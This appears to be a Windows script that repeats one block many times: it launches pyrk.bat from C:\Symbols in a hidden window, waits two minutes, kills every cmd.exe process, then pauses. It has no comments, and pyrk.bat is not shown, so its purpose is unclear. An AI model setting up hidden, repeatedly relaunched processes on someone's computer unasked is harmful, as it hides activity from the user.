cd C:\Symbols
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40
start-process pyrk.bat -windowstyle hidden pyrk.bat
timeout /t 120
taskkill /IM cmd.exe
timeout /t 40

